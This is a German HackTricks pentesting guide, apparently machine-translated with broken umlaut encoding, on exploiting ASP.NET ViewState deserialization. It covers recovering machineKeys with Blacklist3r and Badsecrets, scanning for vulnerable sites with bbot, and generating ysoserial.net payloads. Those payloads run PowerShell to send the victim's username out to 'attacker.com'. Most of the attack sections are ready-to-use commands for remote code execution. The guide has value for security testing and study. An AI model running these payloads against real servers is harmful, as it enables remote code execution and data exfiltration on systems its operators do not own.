# Ausnutzung von \_\_VIEWSTATE ohne Kenntnis der Geheimnisse

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie sich f√ºr eine **Karriere im Hacking** interessieren und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

## Was ist ViewState

**ViewState** dient in ASP.NET als Standardmechanismus zum Speichern von Seiten- und Steuerungsdaten √ºber Webseiten hinweg. W√§hrend der Darstellung des HTML einer Seite werden der aktuelle Zustand der Seite und Werte, die w√§hrend eines Postbacks erhalten bleiben sollen, in base64-kodierte Zeichenketten serialisiert. Diese Zeichenketten werden dann in versteckten ViewState-Feldern platziert.

ViewState-Informationen k√∂nnen durch die folgenden Eigenschaften oder deren Kombinationen charakterisiert werden:

- **Base64**:
- Dieses Format wird verwendet, wenn die Attribute `EnableViewStateMac` und `ViewStateEncryptionMode` auf false gesetzt sind.

- **Base64 + MAC (Message Authentication Code) aktiviert**:
- Die Aktivierung von MAC erfolgt durch das Setzen des Attributes `EnableViewStateMac` auf true. Dadurch wird die Integrit√§tspr√ºfung f√ºr ViewState-Daten erm√∂glicht.

- **Base64 + Verschl√ºsselung**:
- Die Verschl√ºsselung wird angewendet, wenn das Attribut `ViewStateEncryptionMode` auf true gesetzt ist und somit die Vertraulichkeit der ViewState-Daten gew√§hrleistet wird.

## Testf√§lle

Das Bild ist eine Tabelle, die verschiedene Konfigurationen f√ºr ViewState in ASP.NET basierend auf der .NET Framework-Version darstellt. Hier ist eine Zusammenfassung des Inhalts:

1. F√ºr **beliebige Versionen von .NET**, wenn sowohl MAC als auch Verschl√ºsselung deaktiviert sind, ist kein MachineKey erforderlich und es gibt somit keine anwendbare Methode, um ihn zu identifizieren.

2. F√ºr **Versionen unter 4.5**, wenn MAC aktiviert, aber Verschl√ºsselung deaktiviert ist, wird ein MachineKey ben√∂tigt. Die Methode zur Identifizierung des MachineKey wird als "Blacklist3r" bezeichnet.

3. F√ºr **Versionen unter 4.5**, unabh√§ngig davon, ob MAC aktiviert oder deaktiviert ist, wenn Verschl√ºsselung aktiviert ist, wird ein MachineKey ben√∂tigt. Die Identifizierung des MachineKey ist eine Aufgabe f√ºr "Blacklist3r - Zuk√ºnftige Entwicklung".

4. F√ºr **Versionen 4.5 und h√∂her** erfordern alle Kombinationen von MAC und Verschl√ºsselung (ob beide wahr sind oder eine wahr und die andere falsch ist) einen MachineKey. Der MachineKey kann mit "Blacklist3r" identifiziert werden.


### Testfall: 1 ‚Äì EnableViewStateMac=false und viewStateEncryptionMode=false

Es ist auch m√∂glich, den ViewStateMAC vollst√§ndig zu deaktivieren, indem der Registrierungsschl√ºssel `AspNetEnforceViewStateMac` auf null gesetzt wird in:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identifizieren von ViewState-Attributen**

Sie k√∂nnen versuchen festzustellen, ob ViewState durch das Erfassen einer Anfrage mit diesem Parameter in BurpSuite MAC-gesch√ºtzt ist. Wenn Mac nicht verwendet wird, um den Parameter zu sch√ºtzen, k√∂nnen Sie ihn mit [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) ausnutzen.
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Testfall 1.5 - Wie Testfall 1, aber der ViewState-Cookie wird nicht vom Server gesendet

Entwickler k√∂nnen ViewState entfernen, sodass es nicht Teil einer HTTP-Anfrage wird (der Benutzer erh√§lt diesen Cookie nicht).\
Man k√∂nnte annehmen, dass, wenn ViewState nicht vorhanden ist, ihre Implementierung vor potenziellen Sicherheitsl√ºcken bei der ViewState-Deserialisierung gesch√ºtzt ist.\
Das ist jedoch nicht der Fall. Wenn wir den ViewState-Parameter zum Anfragek√∂rper hinzuf√ºgen und unsere serialisierte Payload, die mit ysoserial erstellt wurde, senden, k√∂nnen wir immer noch Codeausf√ºhrung erreichen, wie im Fall 1 gezeigt.


### Testfall 2 - .Net < 4.5 und EnableViewStateMac=true & ViewStateEncryptionMode=false

Um ViewState MAC f√ºr eine bestimmte Seite zu aktivieren, m√ºssen wir folgende √Ñnderungen an einer bestimmten aspx-Datei vornehmen:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Wir k√∂nnen dies auch f√ºr die gesamte Anwendung tun, indem wir es in der Datei **web.config** wie unten gezeigt festlegen:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Da der Parameter dieses Mal durch MAC gesch√ºtzt ist, ben√∂tigen wir zun√§chst den verwendeten Schl√ºssel, um den Angriff erfolgreich auszuf√ºhren.

Sie k√∂nnen versuchen, [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) zu verwenden, um den verwendeten Schl√ºssel zu finden.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) ist ein weiteres Tool, mit dem bekannte machineKeys identifiziert werden k√∂nnen. Es ist in Python geschrieben, daher gibt es im Gegensatz zu Blacklist3r keine Abh√§ngigkeit von Windows. F√ºr .NET-Viewstates gibt es ein "Python Blacklist3r"-Dienstprogramm, das der schnellste Weg ist, es zu verwenden.

Es kann entweder direkt mit dem Viewstate und dem Generator bereitgestellt werden:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Alternativ kann es sich direkt mit der Ziel-URL verbinden und versuchen, den Viewstate aus dem HTML herauszuschneiden:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Um nach verwundbaren Viewstates im gro√üen Ma√üstab zu suchen, kann das `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md)-Modul in Verbindung mit der Subdomain-Ermittlung verwendet werden:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Wenn Sie Gl√ºck haben und der Schl√ºssel gefunden wird, k√∂nnen Sie mit dem Angriff mit [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** fortfahren:
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
In F√§llen, in denen der `_VIEWSTATEGENERATOR`-Parameter **vom Server nicht gesendet wird**, m√ºssen Sie den `--generator`-Parameter **nicht angeben**, sondern **diese**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Testfall: 3 - .Net < 4.5 und EnableViewStateMac=true/false und ViewStateEncryptionMode=true

In diesem Fall ist nicht bekannt, ob der Parameter mit MAC gesch√ºtzt ist. Dann ist der Wert wahrscheinlich verschl√ºsselt und Sie ben√∂tigen den Machine Key, um Ihre Nutzlast zu verschl√ºsseln und die Schwachstelle auszunutzen.

In diesem Fall befindet sich das [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)-Modul in der Entwicklung...

Vor .NET 4.5 kann ASP.NET einen unverschl√ºsselten \_\_VIEWSTATE-Parameter von den Benutzern akzeptieren, selbst wenn ViewStateEncryptionMode auf "Always" gesetzt wurde. ASP.NET √ºberpr√ºft nur das Vorhandensein des \_\_VIEWSTATEENCRYPTED-Parameters in der Anfrage. Wenn dieser Parameter entfernt wird und die unverschl√ºsselte Nutzlast gesendet wird, wird sie dennoch verarbeitet.

Daher k√∂nnen Angreifer, wenn sie einen Weg finden, den Machine Key √ºber eine andere Schwachstelle wie Dateitraversal zu erhalten, den [YSoSerial.Net](https://github.com/pwntester/ysoserial.net)-Befehl aus dem Fall 2 verwenden, um RCE mithilfe der ViewState-Deserialisierungsschwachstelle durchzuf√ºhren.

- Entfernen Sie den `__VIEWSTATEENCRYPTED`-Parameter aus der Anfrage, um die ViewState-Deserialisierungsschwachstelle auszunutzen, sonst wird ein Fehler bei der Viewstate-MAC-Validierung zur√ºckgegeben und der Angriff schl√§gt fehl.

### Testfall: 4 - .Net >= 4.5 und EnableViewStateMac=true/false und ViewStateEncryptionMode=true/false, au√üer beide Attribute auf false

Wir k√∂nnen die Verwendung des ASP.NET-Frameworks erzwingen, indem wir den folgenden Parameter in der web.config-Datei wie unten gezeigt angeben.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternativ kann dies durch Angabe der folgenden Option innerhalb des `machineKey`-Parameters der web.config-Datei erfolgen.
```bash
compatibilityMode="Framework45"
```
Wie zuvor ist der Wert verschl√ºsselt. Um eine g√ºltige Nutzlast zu senden, ben√∂tigt der Angreifer den Schl√ºssel.

Sie k√∂nnen versuchen, [Blacklist3r(AspDotNetWrapper.exe)](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) zu verwenden, um den verwendeten Schl√ºssel zu finden:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
F√ºr eine ausf√ºhrlichere Beschreibung von IISDirPath und TargetPagePath [siehe hier](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Oder mit [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (mit einem Generatorwert):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Sobald ein g√ºltiger Machine Key identifiziert wurde, **ist der n√§chste Schritt, eine serialisierte Nutzlast zu generieren, indem** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) verwendet wird.
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Wenn Sie den Wert von `__VIEWSTATEGENERATOR` haben, k√∂nnen Sie versuchen, den Parameter `--generator` mit diesem Wert zu verwenden und die Parameter `--path` und `--apppath` auszulassen.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Ein erfolgreicher Angriff auf die ViewState-Deserialisierungsschwachstelle f√ºhrt zu einer Out-of-Band-Anfrage an einen vom Angreifer kontrollierten Server, die den Benutzernamen enth√§lt. Dieser Art von Exploit wird in einem Proof of Concept (PoC) demonstriert, der in einer Ressource mit dem Titel "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET" zu finden ist. F√ºr weitere Details zum Funktionsweise des Exploitationsprozesses und zur Verwendung von Tools wie Blacklist3r zur Identifizierung des MachineKey k√∂nnen Sie den bereitgestellten [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC) √ºberpr√ºfen.

### Testfall 6 - ViewStateUserKeys wird verwendet

Die Eigenschaft **ViewStateUserKey** kann verwendet werden, um sich gegen einen **CSRF-Angriff** zu verteidigen. Wenn ein solcher Schl√ºssel in der Anwendung definiert wurde und wir versuchen, die **ViewState**-Payload mit den bisher besprochenen Methoden zu generieren, wird die **Payload von der Anwendung nicht verarbeitet**.\
Sie m√ºssen einen weiteren Parameter verwenden, um die Payload korrekt zu erstellen:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Ergebnis einer erfolgreichen Ausnutzung <a href="#poc" id="poc"></a>

F√ºr alle Testf√§lle, wenn das ViewState YSoSerial.Net-Payload **erfolgreich** funktioniert, antwortet der Server mit "500 Internal Server Error" und dem Antwortinhalt "Die Zustandsinformationen sind ung√ºltig f√ºr diese Seite und k√∂nnten besch√§digt sein" und wir erhalten die OOB-Anforderung.

Weitere Informationen finden Sie [hier]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))

## Referenzen

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
